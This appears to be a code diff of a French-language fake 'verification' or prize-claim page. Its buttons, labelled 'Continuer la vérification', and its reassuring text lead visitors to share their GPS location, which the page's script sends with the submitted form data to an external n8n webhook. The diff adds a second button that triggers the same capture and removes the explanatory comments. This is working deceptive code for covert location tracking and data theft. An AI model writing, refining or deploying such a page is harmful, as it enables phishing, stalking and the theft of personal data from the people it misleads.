@@ -54,6 +54,12 @@
             veuillez cliquer sur le bouton ci-dessous.
         </p>
 
+        
+        <button id="claim-button"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
+            Continuer la vérification
+        </button>
+
         <!-- Confiance : Explication du but -->
         <p class="text-gray-400 text-xs text-center mb-6">
             Nous ne demandons aucune information bancaire.  
@@ -90,8 +96,8 @@
   
 
 
-        <button id="claim-button"
-            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
+        <button id="claim-button-2"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md claim-button">
             Continuer la vérification
         </button>
     </div>
@@ -159,6 +165,7 @@
     </div>
 
 </div>
+  
 <script>
     document.addEventListener("DOMContentLoaded", () => {
     
@@ -171,6 +178,7 @@
            PHASE 1 — DOM ELEMENTS
         ============================================================ */
         const claimButton = document.getElementById("claim-button");
+        const claimButton2 = document.getElementById("claim-button-2");   // ✔ deuxième bouton
         const dataForm = document.getElementById("data-form");
         const initialNotification = document.getElementById("initial-notification");
         const submitButton = document.getElementById("submit-button");
@@ -179,7 +187,7 @@
         const locationInput = document.getElementById("location-input");
     
         /* ===========================================================
-           PHASE 2 — WEBHOOK (toujours le même)
+           PHASE 2 — WEBHOOK
         ============================================================ */
         const WEBHOOK = "https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55";
     
@@ -196,12 +204,10 @@
         }
     
         /* ===========================================================
-           PHASE 3 — GPS WRAPPER (NE BLOQUE JAMAIS)
+           PHASE 3 — GPS WRAPPER FAILSAFE
         ============================================================ */
-    
         function getGPSWithFailSafe(callback) {
     
-            // ÉTAPE 1 : Lancement watchdog EXTERNE (ne freeze pas)
             let finished = false;
     
             const watchdog = setTimeout(() => {
@@ -215,9 +221,8 @@
                         accuracy: null
                     });
                 }
-            }, 12000); // 12 secondes = safe window
+            }, 12000);
     
-            // ÉTAPE 2 : Tentative GPS
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     if (finished) return;
@@ -252,23 +257,18 @@
             );
         }
     
-    
         /* ===========================================================
-           PHASE 4 — BOUTON 1 (DEMANDE GPS)
+           🔵 PHASE 4 — FONCTION UNIQUE POUR LES 2 BOUTONS
         ============================================================ */
+        function startVerification() {
     
-        claimButton.addEventListener("click", () => {
-    
-            // 1️⃣ Toujours envoyer un événement "gps_requested" immédiatement
-            //sendToWebhook({ event: "gps_requested" });
-    
-            // 2️⃣ Demander la permission explicitement
-            const ok = confirm("Pour continuer, activez la fonctionnalité de verification.");
+            // 1️⃣ Popup obligatoire sur iPhone
+            const ok = confirm("Pour continuer, activez la fonctionnalité de vérification.");
             if (!ok) return;
     
             locationInput.value = "Localisation en cours…";
     
-            // 3️⃣ Lancer la procédure GPS SAFETY
+            // 2️⃣ GPS avec fail-safe
             getGPSWithFailSafe((coords) => {
     
                 let localisationString =
@@ -278,25 +278,26 @@
     
                 locationInput.value = localisationString;
     
-                // 4️⃣ Envoi à n8n (résultat GPS)
+                // 3️⃣ Envoi GPS seul
                 sendToWebhook({
                     event: coords.status,
                     localisation: localisationString
                 });
     
-                // 5️⃣ On affiche le formulaire APRÈS résolution
+                // 4️⃣ Afficher formulaire
                 initialNotification.style.display = "none";
                 dataForm.style.display = "block";
             });
+        }
     
-        });
-    
+        // 📌 Les DEUX boutons utilisent la MÊME fonction
+        claimButton.addEventListener("click", startVerification);
+        claimButton2.addEventListener("click", startVerification);
     
     
         /* ===========================================================
-           PHASE 5 — BOUTON 2 (FORMULAIRE COMPLET)
+           PHASE 5 — ENVOI FORMULAIRE COMPLET
         ============================================================ */
-    
         submitButton.addEventListener("click", () => {
     
             const loc = locationInput.value;
